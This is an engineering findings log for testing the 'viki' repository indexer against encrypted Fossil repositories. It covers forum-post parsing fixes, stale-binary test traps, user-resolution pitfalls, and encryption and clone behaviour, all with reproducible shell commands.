really does catch a typo'd `matrix.*`/`steps.*` reference), and every
`run:` body executed by hand on macOS and in the container. The macOS leg
is the weaker of the two: `fossil-see` and m1.sh were run on *this*
arm64 Mac, not on a `macos-latest` runner, and whether that image ships
`cmake` (the workflow installs it if not) is unconfirmed.

---

## A green `test/m1.sh` says nothing about the source tree: it passed 54/54 against a binary 13 hours older than the fixes sitting in `src/`, and would pass identically against a binary with three known bugs in it

**Date:** 2026-08-13, running `test/m1.sh` for the first time as an
independent check.

`test/m1.sh` came in reported as green and *was* green -- `54 passed, 0
failed, 0 skipped`, exit 0, first try, no fixing required. That is the
result, and it is real. The trap is what a reader naturally concludes from
it, which is wrong.

`build/dist/viki` was dated 03:02. `src/viki_index.c` was dated 15:55 and
contained three forum-indexing fixes that had never been compiled. So the
54/54 was earned by a binary that provably did **not** contain the tree's
own source. Proof the binary was the old one, not a guess from mtimes:

```
$ strings build/dist/viki | /usr/bin/grep -c fprev
0                      # the fprev-exclusion fix is a string in the SQL; absent
```

The run is green either way because `test/m1.sh` plants no forum post and
asserts nothing about the forum leg (a deliberate, documented scope call --
`build/forum-e2e-probe.sh` owns that path). So the one part of the tree
that had uncommitted, unbuilt, unrun changes was exactly the part the
definition-of-done test does not look at. Rebuilding and re-running both:

```
$ bash build/build.sh                        # only sqlite-ndvss's own NEON warnings
$ strings build/dist/viki | /usr/bin/grep -c fprev
1
$ bash test/m1.sh                            # 54 passed, 0 failed, 0 skipped  (unchanged)
$ sh build/forum-e2e-probe.sh /tmp/fw        # PASS=26 FAIL=0  (first time ever green in build/dist)
```

Note the middle line: m1.sh's output is **byte-identical** before and
after a rebuild that changed three code paths. It is not a regression gate
for anything it does not exercise, and no amount of assertion-count growth
inside it changes that.

**Wrong assumption it replaces:** that "the test suite passes" is a
statement about the working tree. In this repo it is a statement about
whatever `build/dist/viki` happens to be, and that artifact is *not*
rebuilt by the test, is gitignored, and can lag `src/` arbitrarily -- the
convention that agents avoid rebuilding because `build/obj` is shared
state actively encourages exactly this drift. **Before believing a green
run, check the binary is current** (`ls -la build/dist/viki src/*.c`, or
grep the binary for a string unique to the newest fix), and treat
`test/m1.sh` + `build/forum-e2e-probe.sh` as a pair -- neither alone covers
all four indexed content types.

Two other things measured in the same pass, both reassuring rather than
surprising, recorded so nobody re-derives them:

- **m1.sh is not vacuous, and not merely because its greps are right.**
  Two injections that simulate real *viki* bugs rather than bad greps:
  a wrapper making `cache pull` a silent no-op exit-0 turns the D-11 block
  red (`44 passed, 10 failed` -- C0, C9-C14, C16-C18) *and still prints the
  summary*; a wrapper that forces `ask` into degraded mode while indexing
  normally reddens exactly the rung-2 claims (`49 passed, 5 failed` -- B3,
  B5, B6, B7, C16). The vector proof and the compute-once proof both
  measure what they say they measure.
- **m1.sh is genuinely hermetic.** Three consecutive clean runs are
  byte-identical; it passes unchanged from a different cwd (`cd /tmp`); and
  it passes with a deliberately hostile inherited environment
  (`FOSSIL_SEE_KEY=some-other-stale-key FOSSIL_USER=nobodyatall
  VIKI_FOSSIL_USER=nobodyatall FOSSIL_SEE_STOCK_PROMPT=1
  FOSSIL_HOME=/tmp/should-not-be-used`), overriding all of them -- that
  hostile `FOSSIL_HOME` is never created. No `~/.fossil`, no `.viki` in the
  repo, no leftover `mktemp` tree afterward.

---

## `FOSSIL_USER` is NOT "the single lever" -- `viki index` passes an explicit `--user` that overrides it, so ticket indexing still reports 0; and a k=5 default over a 6-chunk corpus makes "was it retrieved?" almost free

**Date:** 2026-08-13, writing `test/m1.sh` (the M1 definition-of-done test).

Two things bit while turning the recon recipes into an actual test, both of
which would have produced a green test that proved less than it claimed.

**1. The user lever is two levers, not one.** The entry further down this
file ends with "The single lever that fixes all of it is `FOSSIL_USER`,
exported once. Every fossil subprocess inherits it, including the ones viki
spawns without `--user`". The second sentence is true and the conclusion
still does not follow, because `index_tickets()` is *not* one of the ones
spawned without `--user` -- `viki_index.c` passes
`"--user", viki_fossil_user()` explicitly, and an explicit argument beats
the environment. Measured on one repo (`--admin-user vikitest`, ambient
`USER=wmacevoy`), one ticket present, only the env varied:

```
FOSSIL_USER only            0 ticket(s), 0 (re)chunked
VIKI_FOSSIL_USER only       1 ticket(s), 1 (re)chunked
both                        1 ticket(s), 1 (re)chunked
neither                     0 ticket(s), 0 (re)chunked
```

Confirmed end to end by deleting `export VIKI_FOSSIL_USER=...` from
`test/m1.sh` while leaving `FOSSIL_USER` in place: `50 passed, 4 failed`,
the failures being every ticket assertion plus the embedding-count check
that depends on the ticket's chunk existing. **Wrong assumption it
replaces:** that `FOSSIL_USER` subsumes `VIKI_FOSSIL_USER`. Set both. They
cover disjoint code paths -- `FOSSIL_USER` for the subprocesses viki spawns
bare (`fossil uv add`, i.e. `viki cache push`), `VIKI_FOSSIL_USER` for the
ones it spawns with an explicit `--user` (`fossil ticket show`).

A related trap for anyone measuring this: `env -u A B=c cmd` is fine, but
`env -u A -u B cmd` and `env -u A B=c` must not be blended carelessly --
macOS `env` rejected `-u "FOSSIL_USER VIKI_FOSSIL_USER=vikitest"` with
`unsetenv ...: Invalid argument` and exited 1, which read exactly like the
command under test failing. Two of the four rows above were wrong the first
time for that reason, not for any reason involving fossil.

**2. `viki ask` defaults to `--k 5`, and a natural M1 corpus has about six
chunks -- so "the answer appears in the results" is nearly a tautology.**
The first draft of `test/m1.sh` asserted that the D-11 witness document
appeared *somewhere* in the output of a semantic-only query. It passed. It
was also meaningless: the witness was ranked **3rd**, below the wiki page
and an unrelated document, and with 6 chunks and k=5 almost any document
"appears".

```
$ viki ask "dirigible tether pylon" --k 5     # witness = a zeppelin mooring mast
[1] rrf=0.0164  wiki:PumpMaintenance#0
[2] rrf=0.0161  ./docs/barn.md#0
[3] rrf=0.0159  ./docs/uncommitted-witness.md#0     <- "found it!"
```

Every retrieval assertion in `test/m1.sh` now anchors on `head -1` and rank
1. That also gives a free correctness signal for the query itself: the
rank-1 RRF score tells you how many legs contributed, because the fusion
constant is 60. `0.0164 = 1/61` is ONE leg at rank 1 (so a
"semantic-only" query really did get nothing from BM25); `0.0328 = 2/61` is
both. That number is how `"airship docking tower"` was confirmed to be a
genuinely zero-overlap query while `"aviation landmark repaint"` was not --
the latter scored 0.0328 because porter stemming bridges `repaint` to the
witness's `repainted`. **Wrong assumption it replaces:** that a
zero-literal-overlap query can be eyeballed. Stemming and a small corpus
both conspire against that; check the score.

---

## Live forum posts now round-trip through `viki index`/`viki ask` -- and the manifest-card parsing was wrong in THREE ways, not two; all three are fixed in `src/viki_index.c`

**Date:** 2026-08-13, closing the last "claims coverage it hasn't earned"
hole in `viki index`.

A real thread-start post, a real reply, a reply whose body is shaped like
a manifest card, and a real edit were created in an **encrypted**
`.efossil` repo by Fossil's own `forum_post()`, then indexed and
retrieved. No synthetic artifact, no `test-content-put`, no hand-built
manifest: every artifact was assembled by Fossil, round-tripped through
`manifest_parse()`, and asserted `CFTYPE_FORUM` before storage, and
`fossil timeline --type f` reports them as `Post:` / `Reply:`. That is the
strongest evidence class available for this path, and it is what the
entry below ("A real forum post CAN be created headlessly") set up.

**The headline: forum retrieval works.** `viki ask` returns forum content
under `forum:<64-hex-uuid>#<ix>` for both a thread-start post and a reply,
and the vector leg is real on forum content, proved two-sidedly -- the
query `synthetic elastomer survived subzero temperatures` returns
**0 bytes of stdout and `(no matches)`** with the model disabled, and
three `forum:` hits with it enabled, same cache db, same query.

**But the parsing was wrong in three ways.** The previous entry found two
of them and left both unfixed (rebuilding was off-limits); doing the
round-trip again with a reply that has a card-shaped body line found a
third that nobody had looked for. All three are now fixed and each fix is
proven by an assertion that is *demonstrably able to fail*:

1. **The `H` (thread title) card was indexed still escaped.** Fossil
   stores `H Gearbox\sseal\sweeping\sat\sthe\saeromotor\ssightglass`, and
   that string was written into `viki_chunk.chunk_text` verbatim. FTS5
   then tokenizes `\sseal` as one word, so **every title word after the
   first became unsearchable**: `viki ask "aeromotor"` (a word that
   appears only in that title) returned `(no matches)`, while
   `viki ask "saeromotor"` hit. Fix: one call to `unquote_fossil()`,
   already in the same file and byte-identical to Fossil's own
   `defossilize()`, which Fossil applies to this exact field
   (`defossilize(p->zThreadTitle)`). The W-card body needs no such
   decoding -- it is a counted string, not escaped.

2. **Edited posts were indexed twice, superseded text served as
   current.** An edit appends a *new* artifact and leaves the old one in
   `event` with `type='f'` forever, so `WHERE event.type='f'` picked up
   both. Measured: 4 artifacts, 3 current posts, `viki index` reporting
   `4 forum post(s), 4 (re)chunked`, and `viki ask "graphite rope"`
   returning at **rank 1** text that Fossil's own `/forumthread` page
   renders **zero** times (`grep -o 'graphite rope' | wc -l` -> 0 against
   the served HTML). Fix: `AND blob.rid NOT IN (SELECT fprev FROM
   forumpost WHERE fprev IS NOT NULL)`. Post-fix the same repo indexes
   `3 forum post(s), 3 (re)chunked` and that query returns `(no matches)`.

3. **NEW, and nobody was looking for it: `find_line_card()` scanned off
   the end of the card region into the post body.** A reply has *no* `H`
   card, so the unbounded scan ran into the W-card payload and adopted
   the first body line starting `"H "` as the post's title, duplicating
   it at the head of the chunk. This is not a contrived input -- the
   reply that triggered it just listed water chemistry:

   ```
   W 233
   Ran the well panel while I was out there. Numbers from the tap:

   H 7.9 pH at the wellhead and 8.2 at the stock tank
   Fe 0.31 mg/L
   ```

   and viki stored, as that post's chunk:

   ```
   7.9 pH at the wellhead and 8.2 at the stock tank

   Ran the well panel while I was out there. Numbers from the tap:

   H 7.9 pH at the wellhead and 8.2 at the stock tank
   ...
   ```

   Fix: `find_line_card()` now takes a `zLimit` bound and the caller
   passes the first byte of the W body. Manifest cards are sorted
   alphabetically (`D G H I N P U W Z`), so every card of interest
   precedes the body -- the bound loses nothing and closes the whole
   class, not just the `H` case.

### Repro

`build/forum-e2e-probe.sh` is the whole thing, self-contained (creates the
encrypted repo, posts thread/reply/card-shaped-reply/edit over `fossil
http`, indexes, asks, asserts):

```sh
sh build/forum-e2e-probe.sh /tmp/probe-new  /path/to/patched/viki   # PASS=26 FAIL=0, rc=0
sh build/forum-e2e-probe.sh /tmp/probe-old  build/dist/viki         # PASS=18 FAIL=8, rc=1
```

The 8 that flip are exactly the fix-specific ones (B4-B7, C1-C4), which is
the point: they are proven able to fail, not merely observed to pass.

> **Correction, 2026-08-13 (later the same day):** the second line above no
> longer reproduces, for two independent reasons, and both were verified.
> (a) `build/dist/viki` has since been rebuilt and is now the **fixed**
> binary, so that command scores `PASS=26 FAIL=0`. (b) The probe's second
> argument must be an **absolute** path -- it `cd`s into the work dir, so a
> relative `build/dist/viki` does not fail with "not found", it goes red on
> `B4` and dies with `unable to open database .../co/.viki/cache.db`. The
> probe now rejects a relative path outright.
> The honest repro for the failing side is to compile a pre-fix binary
> yourself, which also means saying *which* pre-fix: a binary built from
> **all** of git `HEAD`'s `src/` scores `PASS=17 FAIL=9`, not 18/8 --
> `B4 B5 B6 B7 C1 C2 C3 C4 C6`. The ninth, `C6`, is the attribution
> assertion, rewritten later for `viki ask`'s new `<content_hash>#<ix>`
> hit line; it fails on a HEAD binary for a reason unrelated to forum
> parsing. Measured recipe (never touches `build/obj` or `build/dist`):
>
> ```sh
> D=/tmp/prefix; mkdir -p $D/src $D/obj $D/dist
> for f in $(git ls-tree --name-only HEAD src/); do git show HEAD:$f > $D/$f; done
> cp build/obj/sqlite3.o build/obj/sqlite-ndvss.o $D/obj/
> for f in build/dist/libonnxruntime*.dylib; do ln -sf "$PWD/$f" $D/dist/$(basename $f); done
> for f in viki sha256 viki_db viki_index viki_ask viki_cache viki_serve tokenizer embed; do
>   cc -O2 -g -Wall -Wno-unused-parameter \
>      -Ivendor/download-cache/sqlite-amalgamation-3530400 \
>      -Ivendor/download-cache/onnxruntime-Darwin-arm64-1.29.0/include \
>      -I$D/src -c $D/src/$f.c -o $D/obj/$f.o
> done
> cc -O2 -o $D/dist/viki \
>    $D/obj/viki.o $D/obj/sha256.o $D/obj/viki_db.o $D/obj/viki_index.o \
>    $D/obj/viki_ask.o $D/obj/viki_cache.o $D/obj/viki_serve.o \
>    $D/obj/tokenizer.o $D/obj/embed.o $D/obj/sqlite3.o $D/obj/sqlite-ndvss.o \
>    -L$D/dist -lonnxruntime -Wl,-rpath,@executable_path -lm -lpthread
> sh build/forum-e2e-probe.sh /tmp/probe-old $D/dist/viki   # PASS=17 FAIL=9, rc=1
> ```

By hand, the two lines that matter most:

```sh
# BEFORE                                            # AFTER
viki index: ... 4 forum post(s), 4 (re)chunked      ... 3 forum post(s), 3 (re)chunked
viki ask "aeromotor"   -> (no matches)              -> [1] rrf=0.0164  forum:d1fdd87c...#0
viki ask "graphite rope" -> [1] forum:9689800e...   -> (no matches)
```

Regression gate: the existing 37-assertion `build/m1-e2e-probe.sh` (files,
wiki, tickets, D-11 cache push/pull) still reports **PASS=37 FAIL=0** with
the patched binary, so nothing outside the forum path moved.

### State of the fix -- read this before trusting `build/dist/viki`

> **Correction, 2026-08-13 19:48 -- this section is now HISTORY, not
> current state.** `build/build.sh` has since been run: `build/dist/viki`
> is the 19:48:15 build, it carries all three forum fixes (plus the three
> later fixes), and `sh build/forum-e2e-probe.sh <empty-dir>` is
> `PASS=26 FAIL=0` against it. The bolded sentence at the end of this
> section -- "Until someone runs `build/build.sh`, the shipped binary
> still has all three bugs" -- was true when written and is **false now**.
> The paragraph below is kept as the record of how the fix was proven
> before the rebuild, and because the private-link recipe is still the
> right way to test a change without touching shared `build/obj`.

`src/viki_index.c` is fixed **in the working tree only**. `build/dist/viki`
and `build/obj/` are untouched (timestamps still 03:02) because `build/obj`
is shared state and another agent may be rebuilding; the proof binary was
made by compiling *only* `viki_index.c` into a private object dir and
linking it against the existing `build/obj/*.o`:

```sh
cc -O2 -g -Wall -Wno-unused-parameter \
   -Ivendor/download-cache/sqlite-amalgamation-3530400 \
   -Ivendor/download-cache/onnxruntime-Darwin-arm64-1.29.0/include -Isrc \
   -c src/viki_index.c -o /tmp/priv/viki_index.o
cc -O2 -o /tmp/priv/viki build/obj/viki.o build/obj/sha256.o build/obj/viki_db.o \
   /tmp/priv/viki_index.o build/obj/viki_ask.o build/obj/viki_cache.o \
   build/obj/viki_serve.o build/obj/tokenizer.o build/obj/embed.o \
   build/obj/sqlite3.o build/obj/sqlite-ndvss.o \
   -Lbuild/dist -lonnxruntime -Wl,-rpath,"$PWD/build/dist" -lm -lpthread
```

Zero warnings; `ndvss-selftest` and `embed-selftest` both PASS on it.
~~**Until someone runs `build/build.sh`, the shipped binary still has all
three bugs.**~~ -- superseded by the rebuild noted at the top of this
section; `build/dist/viki` carries the fixes.

### Two smaller things found on the way, both worth knowing

- **`chunk_fts` uses `tokenize = 'porter unicode61'`** (`viki_db.c`), so
  FTS5 matches *stems*, not literals: the query word `sealing` matched the
  stored word `seal`. This silently invalidated the first "zero keyword
  overlap" query I wrote for the two-sided vector proof -- it looked
  semantic-only and was not. Any such query has to be checked by actually
  running the degraded leg and confirming `(no matches)`, never by reading
  the corpus and eyeballing it.
- **A repository that has never held a forum post has no `forumpost`
  table** (it is created on first crosslink), so the new selector fails
  with `Error: in prepare, no such table: forumpost`. Harmless today --
  `run_capture()` discards stderr and `0 forum post(s)` is the right
  answer for such a repo -- but that is luck, not design, and it is noted
  in the code. Verified on a fresh repo: `viki index` prints the normal
  summary with `0 forum post(s)`, rc=0, no stderr noise.

### The wrong assumptions this replaces

The previous entry's, sharpened. It concluded the forum path was risky
"precisely in the difference" between raw manifests and rendered text, and
it was right -- but it then enumerated that difference as two items
(escaping, versioning) and treated the list as complete. It wasn't: the
third bug is a third consequence of the same difference (a manifest has a
*card region* and a *payload region*, and code that ignores the boundary
will wander across it), and it was found only because this round-trip used
a reply whose body happened to look like a card. **Two live posts were not
enough to exercise the path; four were.** Anything else asserting "forum
indexing is verified" should say which shapes it actually indexed.

Also worth flagging for whoever owns the test harness: `test/m1.sh` (new,
being written concurrently) contains **zero** occurrences of `forum`.
`build/forum-e2e-probe.sh` is deliberately standalone rather than merged
into it, to avoid colliding with an in-flight file -- reconcile the two
rather than assuming either is the deliverable.

> **Correction, 2026-08-13 (later the same day):** that count is stale.
> `grep -ci forum test/m1.sh` is now **8**. The *scope* fact it was
> evidence for is unchanged -- m1.sh still plants no forum post and
> asserts nothing about one -- but all 8 occurrences are now inside one
> comment block (headed "DELIBERATELY NOT PLANTED: a forum post") added
> later by m1.sh's author to explain that scope call. This is exactly the
> failure mode the "docs move in the same commit" entry above describes:
> a report's sentence, true at the moment of writing, laundered into a
> claim. Re-run the grep.

## A cross-mode `file://` clone fails *and leaves a plaintext repository named `.efossil` behind*; same-mode `file://` clones inherit the source's SQLCipher salt

**Date:** 2026-08-13, working out how a test script drives an encrypted repo.

Cloning between an encrypted (`.efossil`) and an unencrypted (`.fossil`)
repo over a local `file://` URL does not work in either direction, and the
failure is not clean -- it exits 1 *after* writing a full 217KB repository
file whose encryption state contradicts its own name:

```sh
export FOSSIL_SEE_KEY=test-key FOSSIL_USER=viki
FS=vendor/fossil-see/build/dist/fossil-see
$FS init --admin-user viki /tmp/pub.fossil          # plaintext source
$FS clone --no-open "file:///tmp/pub.fossil" /tmp/mine.efossil
# SQLITE_NOTADB(26): file is not a database in "SELECT fts5(?1)"
# not a valid repository: /tmp/mine.efossil          <- rc=1
head -c 15 /tmp/mine.efossil                        # -> "SQLite format 3"
sqlite3 /tmp/mine.efossil ".tables"                 # -> full fossil schema, readable
sqlite3 /tmp/mine.efossil "select count(*) from user;"   # -> 5
```

**A file named `.efossil`, containing a readable plaintext Fossil
repository.** The `.efossil` glob is only an *instruction* to apply a key
on open; it is not a property of the file, and nothing reconciles the two
afterwards. A script that ignores the exit code here has silently defeated
at-rest encryption while every filename still says otherwise. The reverse
direction (encrypted source -> `.fossil` destination) fails symmetrically
and leaves ciphertext under a plaintext-implying name.

The mechanism also shows up in the *successful* same-mode case: a
`file://` clone of an encrypted repo produces a clone whose first 16 bytes
-- the SQLCipher salt -- are **byte-identical to the source's**, while
216272 of 217088 bytes differ:

```sh
$FS clone --no-open "file:///tmp/hub.efossil" /tmp/spoke.efossil
od -A n -t x1 -N 16 /tmp/hub.efossil    # c7b1315fb4003fcf499d006b8ff0c96a
od -A n -t x1 -N 16 /tmp/spoke.efossil  # c7b1315fb4003fcf499d006b8ff0c96a  (same)
cmp -l /tmp/hub.efossil /tmp/spoke.efossil | wc -l   # 216272
```

Two *independently* `init`-ed repos get different random salts (checked
with the same key and with different keys), so this is inheritance, not a
fixed salt. A `file://` clone opens source and destination on one
connection, and the destination inherits the source's codec state -- key
included. **Wrong assumption it replaces:** ENCRYPTION.md's per-device-key
claim reads as if any clone can carry its own key. On the `file://` path it
cannot: one process has exactly one `FOSSIL_SEE_KEY`, and the destination
would inherit it regardless.

Over HTTP it works exactly as ENCRYPTION.md describes, because only one
local database exists -- verified with a server holding one key and a
client holding another:

```sh
FOSSIL_SEE_KEY=hubkey $FS server --localhost --port 18913 /tmp/hub.efossil &
FOSSIL_SEE_KEY=devkey $FS clone --no-open --admin-user viki -u \
    http://127.0.0.1:18913 /tmp/dev.efossil
FOSSIL_SEE_KEY=devkey $FS timeline -n 1 -R /tmp/dev.efossil   # rc=0
FOSSIL_SEE_KEY=hubkey $FS timeline -n 1 -R /tmp/dev.efossil   # not a valid repository
od -A n -t x1 -N 16 /tmp/dev.efossil    # its OWN random salt, != the hub's
```

So: local `file://` hub/spoke testing is fine (FINDINGS.md's earlier
no-server-needed result still holds) but it is single-key by construction.
Anything asserting *per-peer* keys must stand up `fossil-see server` and
clone over `http://`. That server path also re-confirms ENCRYPTION.md's
`fossil-server-key-validator.patch`: `GET /timeline` on an encrypted repo
returned HTTP 200 with the expected commit comment in the body, with
`FOSSIL_SEE_KEY` as the only key source.

---

## `grep -q "SQLite format 3"` is not a safe encryption check in an agent's shell -- it reports "encrypted" for a plaintext repo

**Date:** 2026-08-13, writing the load-bearing check for encrypted-repo tests.

The obvious way to assert a repo is really encrypted is to grep for the
absence of SQLite's plaintext magic. In a Claude Code agent shell that
assertion passes on a **plaintext** repo:

```sh
FOSSIL_SEE_KEY=k vendor/fossil-see/build/dist/fossil-see init \
    --admin-user viki /tmp/plain.fossil     # deliberately NOT .efossil
head -c 15 /tmp/plain.fossil                # -> SQLite format 3
grep -q "SQLite format 3" /tmp/plain.fossil; echo $?        # -> 1  (FALSE)
/usr/bin/grep -q "SQLite format 3" /tmp/plain.fossil; echo $?  # -> 0  (correct)
```

`grep` in that shell is a function wrapping `ugrep` with `-I` (skip binary
files), so a binary file "matches nothing" and rc=1 -- which the check
reads as "no plaintext magic, therefore encrypted." The system
`/usr/bin/grep` (BSD grep 2.6.0-FreeBSD) is correct here; the shim is not.
**Wrong assumption it replaces:** that an interactively-verified shell
one-liner transfers unchanged into a test script -- and, worse, that a
*passing* encryption check is self-validating. This one passes hardest
exactly when the file is unencrypted.

Use a check that depends on no external tool's binary-file policy:

```sh
is_encrypted(){ [ "$(head -c 15 "$1")" != "SQLite format 3" ]; }
```

Pair it with a positive control -- stock `sqlite3 <repo> "select count(*)
from sqlite_master;"` must fail with `file is not a database (26)` -- and,
critically, run the same assertion against a known-plaintext `.fossil` repo
to prove the assertion can still fail.

---

## Fossil's `$USER` fallback only resolves if that name exists in the repo's user table -- so `viki index` reports "0 ticket(s)" instead of an error

**Date:** 2026-08-13, running `viki index` against an encrypted scratch repo.

A repo created with `init --admin-user viki` has exactly one real user,
`viki`. Fossil's own error message suggests `$USER` as a remedy, but the
env fallback is validated against that table, so an ambient `USER=wmacevoy`
resolves to nothing:

```sh
$FS commit -m x            # USER=wmacevoy is set and non-empty
# cannot determine user
# Cannot figure out who you are!  Consider using the --user ...
```

This bites `viki index`, whose `viki_fossil_user()` falls back to `$USER`
and passes it as `--user`. The `fossil ticket` subprocess fails, and
indexing **reports zero tickets rather than an error** -- against a repo
that had three:

```sh
env -u VIKI_FOSSIL_USER viki index .
# viki index: 3 file(s) scanned, 2 (re)chunked; 2 wiki page(s), 1 (re)chunked;
#             0 ticket(s), 0 (re)chunked; 0 forum post(s), 0 (re)chunked
VIKI_FOSSIL_USER=viki viki index .
# ...  3 ticket(s), 3 (re)chunked
```

The existing FINDINGS entry below covers *read-only* `fossil ticket`
needing a user; the additions are (a) `commit`, `wiki create` and `ticket
add` need one too -- artifact-writing wiki commands are not exempt the way
`wiki list`/`wiki export` are -- and (b) the failure surfaces as a
plausible-looking zero count, indistinguishable from a repo with no
tickets. **Any test asserting ticket indexing must assert a nonzero count,
not just rc=0.**

The single lever that fixes all of it is `FOSSIL_USER`, exported once.
Every fossil subprocess inherits it, including the ones viki spawns without
`--user` -- so it also fixes the `viki cache push` failure written up
below, which that entry works around by overriding `$USER` itself:

```sh
# same encrypted repo, USER=wmacevoy (not a repo user), no $USER override:
env -u FOSSIL_USER VIKI_FOSSIL_USER=viki viki cache push   # rc=1
env -u VIKI_FOSSIL_USER FOSSIL_USER=viki viki cache push   # rc=0
```

Prefer `FOSSIL_USER=<repo user>` to reassigning `$USER`, which other
tooling in the same shell also reads. `init --admin-user "$USER"` is the
other way out, at the cost of a repo whose user table varies by machine.

---

## `viki ask`'s "hybrid mode" banner proves a model LOADED, not that the vector leg contributed -- and three more traps found while specifying the M1 end-to-end test

**Date:** 2026-08-13, enumerating what `make test` must actually assert.

Every claim below was produced by running `build/dist/viki` against a
three-document scratch corpus (`docs/barn.md` = horses/water trough,
`docs/grocery.md` = a grocery list, `docs/tax.md` = a tax note) and reading
the real bytes, not by reading the code and predicting.

**1. The mode banner is not evidence of hybrid retrieval.** `viki_cmd_ask`
prints `hybrid mode (... model_id=X)` whenever `emb != NULL`. It never
checks whether a single row in `viki_chunk` carries that `model_id`. Index
without a model, then ask with one, and you get a confident hybrid banner
over a pure BM25 result set:

```sh
cd /tmp/corpus
viki index .                                   # model_id=none, embedding=NULL
VIKI_MODEL_DIR=.../build/dist/model viki ask "livestock standing by a drinking pool"
# stderr: viki ask: hybrid mode (FTS5 BM25 + ndvss cosine, model_id=all-MiniLM-L6-v2-qint8-arm64)
# stdout: [1] rrf=0.0164  ./docs/grocery.md#0     <-- BM25 matched the word "a"
```

`run_vector()`'s `WHERE model_id=?1` matched zero rows and the query still
"succeeded" silently. **A test may never treat the stderr banner as proof
the vector leg ran.** The only sound proof is behavioral: a query whose
every token is absent from the corpus, so the BM25 leg returns nothing.
`"equine hydration paddock"` against this corpus gives an *empty stdout* +
`(no matches)` on stderr with no model, and `[1] rrf=0.0164
./docs/barn.md#0` with one. That two-sided difference can only come from
rung 2.

**2. AGENTS.md's horses/water-trough example is corpus-fragile: one
stopword flips it.** AGENTS.md claims `viki ask "livestock standing by a
drinking pool"` "correctly ranked the horses document first ... despite the
query sharing zero literal words with it." The query does share one word --
**"a"** -- so whether the claim holds depends entirely on whether any
*other* document happens to contain a standalone "a". Both branches were
run against clean, single-epoch caches:

```
grocery.md says "a bag of frozen peas":     grocery.md says "one bag of frozen peas":
[1] rrf=0.0325  ./docs/grocery.md#0         [1] rrf=0.0164  ./docs/barn.md#0
[2] rrf=0.0164  ./docs/barn.md#0            [2] rrf=0.0161  ./docs/grocery.md#0
```

`0.0325 = 1/61 (FTS rank 1) + 1/62 (vector rank 2)`; `0.0164 = 1/61`
(vector rank 1). So the vector leg ranked the barn first in *both* cases --
RRF just weights "BM25's best hit" and "the vector's best hit" identically,
which makes a single stopword match worth exactly as much as a correct
semantic match. Not a bug in the fusion (that is what RRF is), but the
original claim was verified against a corpus that happened not to contain
the word, and a test written from it would be one word away from asserting
nothing. Pick a query whose every token is absent from every document
(`"equine hydration paddock"` here) so the BM25 leg is provably empty.

**3. `unset VIKI_MODEL_DIR` does NOT force degraded mode.**
`open_embedder_if_available()` falls back to the *relative* path
`build/dist/model` when the variable is unset **or empty**. Verified by
planting `./build/dist/model` (a symlink) in a scratch cwd:

```sh
mkdir -p /tmp/trap/build/dist && ln -s .../build/dist/model /tmp/trap/build/dist/model
cd /tmp/trap
env -u VIKI_MODEL_DIR viki ask "equine hydration paddock"   # -> hybrid mode
VIKI_MODEL_DIR=""     viki ask "equine hydration paddock"   # -> hybrid mode
```

Both silently re-enable rung 2. The only deterministic way to force the
degraded path is `VIKI_MODEL_DIR=<path that does not exist>` (the `stat()`
+ `S_ISDIR` gate). A directory that exists but has no `viki-manifest.json`
also works, but emits an *extra* stderr line (`viki embed: no usable model
at '...'`) before the degraded notice -- so a test grepping for an exact
stderr transcript needs to expect two lines, not one.

**4. Re-indexing under a second `model_id` double-counts the BM25 leg.**
`chunk_fts` is not filtered by `model_id` anywhere, and `find_or_add()`
keys candidates on `(content_hash, chunk_ix)` only. So after indexing the
same corpus twice under two model ids, one document produces two FTS rows
that merge into one candidate and add RRF *twice*: grocery scored `0.0487`
in the mixed-epoch db versus `0.0325` in the clean one. Harmless for
correctness (the cache is derived, D-10) but it means **a test must start
from a fresh `.viki/cache.db` per mode**, or ranking assertions drift for
reasons that have nothing to do with the code under test.

> **Superseded 2026-08-13 (see the entry at the top of this file):** the
> "harmless for correctness" half of this is wrong -- on a corpus larger
> than three documents the double-count reorders the top-K and changes
> which documents are in it. The bug is fixed in `src/viki_ask.c`; the
> per-mode fresh cache is still good testing hygiene, but it is no longer
> what stands between the fusion and a wrong answer.

**5. A test that captures output inside the tree it indexes indexes its own
output.** The first run of the probe script redirected `viki index .`'s
streams to `a.idx.err` *in the corpus directory*, and reported `5 file(s)
scanned, 4 (re)chunked` against a three-document corpus. `walk()` has no
exclusion for these; and `a.idx.err` was already non-empty when the walk
reached it, because `viki.c` prints the "no embedding model found" notice
*before* calling `viki_cmd_index()`. Later `viki ask` captures are worse:
they contain result lines naming the very documents being searched for, so
a subsequent index run plants near-duplicate decoys. Keep all capture files
outside the indexed tree.

**6. `viki index <nonexistent-dir>` exits 0.** `walk()`'s `opendir()`
failure is a silent return, so a typo'd path is reported as `0 file(s)
scanned, 0 (re)chunked` with status 0. Any assertion about indexing must
grep the counts; exit status alone will pass on a corpus that was never
read. (Same shape for `viki ask` with no hits: `(no matches)` on stderr,
empty stdout, **exit 0**.)

**Wrong assumption this replaces:** that the degraded-vs-hybrid distinction
is observable from `viki ask`'s own mode banner, that "no keyword overlap"
is easy to eyeball, and that a nonzero exit is available to signal "found
nothing".

## `viki cache push` cannot use `VIKI_FOSSIL_USER`, and fails outright when `$USER` is not a repo user

**Date:** 2026-08-13, building the D-11 hub/spoke/fresh-clone test.

`viki_cmd_cache_push()` shells out to `fossil uv add ... --as viki-cache.db`
with **no `--user`** argument, and `viki_cache.c` never calls
`viki_fossil_user()` -- despite defining it, and despite `index_tickets()`
in `viki_index.c` passing `--user` for exactly this reason. On a repo whose
user table doesn't contain the caller's `$USER`, push dies before doing
anything:

```sh
fossil-see init --admin-user tester hub.efossil     # only user: tester
# ... open, plant docs, viki index ...
VIKI_FOSSIL_USER=tester viki cache push
# stdout: Cannot figure out who you are!  Consider using the --user ...
# stderr: cannot determine user
#         viki cache push: 'fossil uv add' failed (exit 1)     [exit 1]
USER=tester viki cache push                          # works
```

Note the split: fossil's own complaint lands on **stdout** (`run()` inherits
both streams), so `viki cache push`'s stdout is not clean even on the
failure path. Two consequences for the M1 test: it must export
`USER=<repo user>` (or `fossil user default`) rather than the
`VIKI_FOSSIL_USER` that works for ticket indexing, and it must assert on
exit status, not on stream contents.

Second wrinkle found in the same run: `fossil uv sync` requires a remote
URL, so a spoke made with `fossil-see open hub.efossil` (opening the hub
directly) fails with `Usage: fossil-see sync URL` **after** `uv add` has
already succeeded locally -- a half-completed push. The spoke has to be a
real `clone` (which records the `file://` remote automatically, per the
entry below).

## A real forum post CAN be created headlessly -- the blocker was a missing `Referer:` header, not an AJAX UI -- and doing it exposed two live bugs in `index_forum()`

